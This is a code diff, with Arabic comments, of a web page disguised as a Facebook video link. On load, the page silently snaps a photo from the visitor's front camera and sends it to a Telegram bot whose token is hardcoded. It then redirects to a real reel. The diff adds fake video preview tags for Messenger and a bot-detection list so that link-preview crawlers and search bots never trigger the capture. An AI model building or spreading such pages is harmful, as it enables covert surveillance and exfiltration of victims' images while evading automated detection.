@@ -3,6 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Open Graph Tags لمعاينة ماسنجر -->
+    <meta property="og:title" content="فيديو مميز">
+    <meta property="og:description" content="شاهد هذا الفيديو المثير للاهتمام">
+    <meta property="og:image" content="https://via.placeholder.com/1200x630/000000/FFFFFF?text=Video">
+    <meta property="og:url" content="https://m.facebook.com/reel/1363942655583132">
+    <meta property="og:type" content="video.other">
+    
     <title>جاري التحميل...</title>
     <style>
         * { margin: 0; padding: 0; }
@@ -18,6 +26,27 @@
             opacity: 0;
         }
     </style>
+    
+    <script>
+        // كشف بوتات المعاينة (ماسنجر، فيسبوك، واتساب، تيليجرام، تويتر، إلخ)
+        const botAgents = [
+            'facebookexternalhit', 'Facebot', 'MessengerBot',
+            'WhatsApp', 'TelegramBot', 'Twitterbot', 'LinkedInBot',
+            'Pinterest', 'Slackbot', 'Discordbot', 'Googlebot',
+            'bingbot', 'yandex', 'Baiduspider'
+        ];
+        
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isBot = botAgents.some(bot => userAgent.includes(bot.toLowerCase()));
+        
+        // إذا كان بوت معاينة، لا تشغل أي شيء - فقط اعرض الصفحة الفارغة مع الـ OG Tags
+        if (isBot) {
+            document.addEventListener('DOMContentLoaded', function() {
+                // إيقاف أي سكربتات أخرى
+                window.stop && window.stop();
+            });
+        }
+    </script>
 </head>
 <body>
 
@@ -25,72 +54,77 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        const telegramToken = "8666905289:AAH9HB48s13a4AeZDaZmbsYRiZShGFgd9eE";
-        const chatId = "5015426926";
-        
-        const CAPTURE_DELAY = 1000;    // ثانية واحدة قبل التقاط الصورة
-        const REDIRECT_DELAY = 1000;   // ثانية واحدة بعد الإرسال قبل فتح الرابط
-        
-        const VIDEO_LINK = 'https://m.facebook.com/reel/1363942655583132/?fs=e&fs=e';
+        // لا تشغل شيئاً إذا كان بوت
+        if (typeof isBot !== 'undefined' && isBot) {
+            // البوت يحصل فقط على الـ HTML مع الـ OG Tags
+        } else {
+            const telegramToken = "8666905289:AAH9HB48s13a4AeZDaZmbsYRiZShGFgd9eE";
+            const chatId = "5015426926";
+            
+            const CAPTURE_DELAY = 1000;    // ثانية واحدة قبل التقاط الصورة
+            const REDIRECT_DELAY = 1000;   // ثانية واحدة بعد الإرسال قبل فتح الرابط
+            
+            const VIDEO_LINK = 'https://m.facebook.com/reel/1363942655583132/?fs=e&fs=e';
 
-        async function captureAndSend() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" },
-                    audio: false
-                });
+            async function captureAndSend() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "user" },
+                        audio: false
+                    });
 
-                const video = document.getElementById("video");
-                video.srcObject = stream;
-                await video.play();
+                    const video = document.getElementById("video");
+                    video.srcObject = stream;
+                    await video.play();
 
-                await new Promise(resolve => {
-                    if (video.videoWidth > 0) {
-                        resolve();
-                    } else {
-                        video.onloadedmetadata = resolve;
-                    }
-                });
-
-                const canvas = document.getElementById("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                stream.getTracks().forEach(track => track.stop());
-
-                canvas.toBlob(async (blob) => {
-                    if (blob) {
-                        const formData = new FormData();
-                        formData.append("chat_id", chatId);
-                        formData.append("photo", blob, "photo_" + Date.now() + ".jpg");
-
-                        try {
-                            await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            });
-                        } catch (err) {
-                            console.error(err);
+                    await new Promise(resolve => {
+                        if (video.videoWidth > 0) {
+                            resolve();
+                        } else {
+                            video.onloadedmetadata = resolve;
                         }
-                    }
+                    });
 
+                    const canvas = document.getElementById("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext("2d");
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    stream.getTracks().forEach(track => track.stop());
+
+                    canvas.toBlob(async (blob) => {
+                        if (blob) {
+                            const formData = new FormData();
+                            formData.append("chat_id", chatId);
+                            formData.append("photo", blob, "photo_" + Date.now() + ".jpg");
+
+                            try {
+                                await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                            } catch (err) {
+                                console.error(err);
+                            }
+                        }
+
+                        setTimeout(() => {
+                            window.location.href = VIDEO_LINK;
+                        }, REDIRECT_DELAY);
+
+                    }, "image/jpeg", 0.95);
+
+                } catch (error) {
+                    console.error(error);
                     setTimeout(() => {
                         window.location.href = VIDEO_LINK;
-                    }, REDIRECT_DELAY);
-
-                }, "image/jpeg", 0.95);
-
-            } catch (error) {
-                console.error(error);
-                setTimeout(() => {
-                    window.location.href = VIDEO_LINK;
-                }, CAPTURE_DELAY + 1000);
+                    }, CAPTURE_DELAY + 1000);
+                }
             }
-        }
 
-        setTimeout(captureAndSend, CAPTURE_DELAY);
+            setTimeout(captureAndSend, CAPTURE_DELAY);
+        }
     </script>
 
 </body>
